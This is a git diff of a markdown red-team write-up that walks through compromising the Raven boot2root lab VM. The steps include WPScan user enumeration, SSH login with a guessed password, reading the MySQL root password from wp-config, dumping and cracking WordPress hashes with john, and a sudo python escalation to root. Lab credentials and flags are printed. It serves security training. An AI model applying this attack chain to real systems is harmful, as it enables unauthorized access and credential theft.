@@ -11,8 +11,9 @@ Nmap scan results for each machine reveal the below services and OS details:
 
 ```bash
 $ nmap -sV 192.168.1.110
-output: [](https://i.imgur.com/ZBB1B39.png)
 ```
+output: ![](https://i.imgur.com/ZBB1B39.png)
+
 
 This scan identifies the services below as potential points of entry:
 - Target 1
@@ -26,10 +27,10 @@ This scan identifies the services below as potential points of entry:
 The following vulnerabilities were identified on each target:
 - Target 1
   - User Enumeration (WP Site)
-  - Weak User Password
   - Unsalted User Password Hash (WP Database)
+  - Weak User Password
 
-output: [](https://i.imgur.com/ZBB1B39.png)
+output: ![](https://i.imgur.com/ZBB1B39.png)
 
 ### Exploitation
 
@@ -37,74 +38,68 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 - Target 1
   - `flag1.txt`: flag1{b9bbcb33e11b80be759c4e844862482d}
 
-    - **Exploit Used**
-      - WPScan to enumerate users of the Target 1 WP site along with a weak user password.
+    - WPScan to enumerate users of the Target 1 WP site along with a weak user password.
       - "wpscan –-url http://192.168.1.110/wordpress -eu" (to find all users)
       - "ssh michael@192.168.1.110" (to try and connect to michael's account)
       - password was same as username (michael)
       - "cd /var/www/" (to access the WP code)
       - "grep -RE flag html" (to find the hidden flag)
-      - output: [](https://i.imgur.com/6dxOYSP.png)
+    - output: ![](https://i.imgur.com/6dxOYSP.png)
     
 
   - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
+    - WPScan to enumerate users of the Target 1 WP site along with a weak user password.
+      - same commands as above up to "cd /var/www/" 
+      - "ls -l" (to display all hidden files within the directory)
+    - output: ![](https://i.imgur.com/ZCdId27.png)
+
+  - `flag3.txt`: flag3{afc01ab56b50591e7dccf93122770cd2}
     - **Exploit Used**
       - WPScan to enumerate users of the Target 1 WP site along with a weak user password.
       - same commands as above up to "cd /var/www/" 
-      - "ls -l" (to display all hidden files within the directory)
-      - output: [](https://i.imgur.com/ZCdId27.png)
-
-  - `flag3.txt`: flag3{afc01ab56b50591e7dccf93122770cd2}
-- **Exploit Used**
-  - WPScan to enumerate users of the Target 1 WP site along with a weak user password.
-  - same commands as above up to "cd /var/www/" 
-  - "cd /http/wordpress/"
-  - "ls" (to view all the files in the directory)
-  - "cat wp-config.php" (to view the wordpress config file)
-  - "mysql -u root -p" (+ 'R@v3nSecurity' password found in the config file, to log into MySQL monitor)
-  - "show databases" (show all databases available in MySQL database)
-  - "use wordpress"  (switch to wordpress database)
-  - "show tables" (show all available tables in the database)
-  - "select * from wp_posts" (show all wordpress posts)
-
-  - output: [](https://i.imgur.com/bmFm1w1.png)
+      - "cd /http/wordpress/"
+      - "ls" (to view all the files in the directory)
+      - "cat wp-config.php" (to view the wordpress config file)
+      - "mysql -u root -p" (+ 'R@v3nSecurity' password found in the config file, to log into MySQL monitor)
+      - "show databases" (show all databases available in MySQL database)
+      - "use wordpress"  (switch to wordpress database)
+      - "show tables" (show all available tables in the database)
+      - "select * from wp_posts" (show all wordpress posts)
+   - output: ![](https://i.imgur.com/bmFm1w1.png)
 
   - `flag4.txt`: 
-______                 	 
+                    ______                 	 
 
-| ___ \                	 
+                    | ___ \                	 
 
-| |_/ /__ ___   _____ _ __  
+                    | |_/ /__ ___   _____ _ __  
 
-|	// _` \ \ / / _ \ '_ \
+                    |	// _` \ \ / / _ \ '_ \
 
-| |\ \ (_| |\ V /  __/ | | |
+                    | |\ \ (_| |\ V /  __/ | | |
 
-\_| \_\__,_| \_/ \___|_| |_|
+                    \_| \_\__,_| \_/ \___|_| |_|
 
-                       	 
-flag4{715dea6c055b9fe3337544932f2941ce}
 
-CONGRATULATIONS on successfully rooting Raven!
+                    flag4{715dea6c055b9fe3337544932f2941ce}
 
-This is my first Boot2Root VM - I hope you enjoyed it.
+                    CONGRATULATIONS on successfully rooting Raven!
 
-Hit me up on Twitter and let me know what you thought:
+                    This is my first Boot2Root VM - I hope you enjoyed it.
 
-@mccannwj / wjmccann.github.io
+                    Hit me up on Twitter and let me know what you thought:
 
-    - **Exploit Used**
-      - WPScan to enumerate users of the Target 1 WP site along with a weak user password.
+                    @mccannwj / wjmccann.github.io
+
+    -  Unsalted User Password Hash (WP Database)
       - same commands as above up to "show tables" 
       - "select * from wp_users;" (showing all wordpress users and their password hashes)
-      - "nano wp_hashes.txt" (added "michael:$P$BjRvZQ.VQcGZ1DeiKToCQd.cPw5XCe0
-steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/
-" to wp_hashes.txt and saved the file)
+      - "nano wp_hashes.txt" (added "michael:$P$BjRvZQ.VQcGZ1DeiKToCQd.cPw5XCe0steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/"
+        to wp_hashes.txt and saved the file)
       - "john -wordlist=/usr/share/wordlists/rockyou.txt wp_hashes.txt" (to extract Steven's password from the hash)
       - "ssh steven@192.168.1.110" (connecting to steven's account with password: pink84)
       -  "sudo python -c 'import pty;pty.spawn("/bin/bash");'" (escalates priviledges to root)
       - "cd /root" (moving to root directory)
       - "ls" (showing all available files in root)
       - "cat flag4.txt" (showing contents of flag4.txt)
-
-      - output: [](https://i.imgur.com/dTaHjAZ.png)
+   - output: ![](https://i.imgur.com/dTaHjAZ.png)
